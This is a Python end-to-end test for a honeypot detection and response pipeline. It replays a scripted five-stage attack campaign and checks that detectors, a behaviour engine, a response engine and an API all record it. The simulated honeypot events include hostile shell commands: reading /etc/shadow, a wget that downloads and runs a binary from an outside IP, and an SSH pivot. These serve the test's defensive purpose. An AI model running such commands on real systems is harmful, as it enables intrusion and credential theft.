"""Week 6 — end-to-end: a 5-stage attack campaign through the LIVE components.

The attack *input* is scripted (as any E2E test must be), but it flows through the
real detectors, normalizer, event store, behaviour engine, response engine and
API — no mocked layers. Verifies the campaign is visible across every layer.

Stages: (1) recon scan  (2) SSH brute-force  (3) login + command exec
        (4) malware download  (5) lateral movement
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "detection"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "pipeline"))

from alert_event import AlertEvent, HoneypotSource          # noqa: E402
from detectors.port_scan import PortScanDetector            # noqa: E402
from detectors.brute_force import BruteForceDetector        # noqa: E402
from behavior import BehaviorEngine                         # noqa: E402
from behavior.features import parse_sessions                # noqa: E402
from response import ResponseEngine, ResponseActuator, RecordingRunner  # noqa: E402
from deception import DeceptionEngine                       # noqa: E402

ATTACKER = "203.0.113.66"


def _store(tmp_path, monkeypatch):
    monkeypatch.setenv("DB_BACKEND", "sqlite")
    monkeypatch.setenv("SQLITE_PATH", str(tmp_path / "cadn.sqlite"))
    from db import EventStore
    return EventStore()


def test_full_campaign_end_to_end(tmp_path, monkeypatch):
    store = _store(tmp_path, monkeypatch)

    # ---- Stage 1: recon port scan (real detector -> real schema -> store) ----
    ps = PortScanDetector()
    det = None
    for port in range(1, 14):
        det = det or ps.observe(ATTACKER, port, now=1000.0)
    assert det, "port scan should fire"
    store.write(AlertEvent(timestamp=AlertEvent.now_ts(), src_ip=ATTACKER,
                           dst_port=det["dst_port"], attack_type="port_scan",
                           severity="medium", honeypot_source=HoneypotSource.SCAPY,
                           detail=det["detail"]).to_dict())

    # ---- Stage 2: SSH brute-force (real detector) ----
    bf = BruteForceDetector()
    bdet = None
    for i in range(7):
        bdet = bdet or bf.observe(ATTACKER, 22, is_syn=True, now=1100.0 + i)
    assert bdet, "brute force should fire"
    store.write(AlertEvent(timestamp=AlertEvent.now_ts(), src_ip=ATTACKER,
                           dst_port=22, attack_type="brute_force", severity="high",
                           honeypot_source=HoneypotSource.SCAPY,
                           detail=bdet["detail"]).to_dict())

    # ---- Stages 3-5: Cowrie session (login, exec, malware, lateral) ----
    events = [
        {"eventid": "cowrie.session.connect", "session": "c1", "src_ip": ATTACKER,
         "timestamp": "2026-06-07T10:00:00+00:00"},
        {"eventid": "cowrie.login.success", "session": "c1", "src_ip": ATTACKER,
         "username": "root", "password": "123456"},
        {"eventid": "cowrie.command.input", "session": "c1", "src_ip": ATTACKER,
         "input": "uname -a; whoami; cat /etc/shadow"},                  # exec + cred dump
        {"eventid": "cowrie.command.input", "session": "c1", "src_ip": ATTACKER,
         "input": "wget http://185.220.101.5/x86 -O /tmp/x86; chmod +x /tmp/x86; /tmp/x86"},
        {"eventid": "cowrie.session.file_download", "session": "c1", "src_ip": ATTACKER,
         "url": "http://185.220.101.5/x86"},                             # malware
        {"eventid": "cowrie.command.input", "session": "c1", "src_ip": ATTACKER,
         "input": "ssh root@10.0.0.21"},                                 # lateral (cmd)
        {"eventid": "cowrie.direct-tcpip.request", "session": "c1", "src_ip": ATTACKER,
         "dst_ip": "10.0.0.21", "dst_port": 22},                         # lateral (pivot)
        {"eventid": "cowrie.session.closed", "session": "c1", "duration": 120.0,
         "timestamp": "2026-06-07T10:02:00+00:00"},
    ]
    behavior = BehaviorEngine(store=store)
    analysis = behavior.analyze_events(events, persist=True)[0]
    # multi-stage campaign with cred dump + malware + pivot -> at least slow/redirect
    assert analysis.threat_score >= 40
    assert analysis.band in ("slow_redirect", "isolate", "block")

    # ---- Response engine acts on the live verdict ----
    dec = DeceptionEngine(workdir=str(tmp_path / "dec"), dry_run=True)
    responder = ResponseEngine(actuator=ResponseActuator(runner=RecordingRunner()),
                               store=store, deception_engine=dec)
    result = responder.respond(src_ip=ATTACKER, threat_score=analysis.threat_score,
                               intent=analysis.intent, band=analysis.band,
                               n_ttps=len(analysis.ttps))
    assert result.band in ("slow_redirect", "isolate", "block")
    assert result.outcomes                       # at least one action taken

    # ---- Verify the campaign is visible across every layer ----
    stats = store.get_stats()
    assert "port_scan" in stats["by_attack_type"]
    assert "brute_force" in stats["by_attack_type"]

    view = store.get_attacker(ATTACKER)
    assert view["profile"] is not None
    assert view["profile"]["threat_score"] >= 40
    # campaign TTPs: ingress transfer + credential dump captured
    assert {"T1105", "T1003.008"} <= set(view["profile"]["ttps"])
    assert len(view["responses"]) >= 1                        # action recorded

    # ---- And through the live API ----
    from api import create_app
    monkeypatch.setenv("ADMIN_USER", "admin")
    monkeypatch.setenv("ADMIN_PASS", "secret")
    monkeypatch.setenv("JWT_SECRET", "y" * 32)
    client = create_app(store=store, start_feed=False).test_client()
    tok = client.post("/api/auth/login",
                      json={"username": "admin", "password": "secret"}).get_json()["token"]
    H = {"Authorization": "Bearer " + tok}
    api_view = client.get(f"/api/attackers/{ATTACKER}", headers=H).get_json()
    assert api_view["profile"]["threat_score"] >= 40
    assert len(api_view["responses"]) >= 1
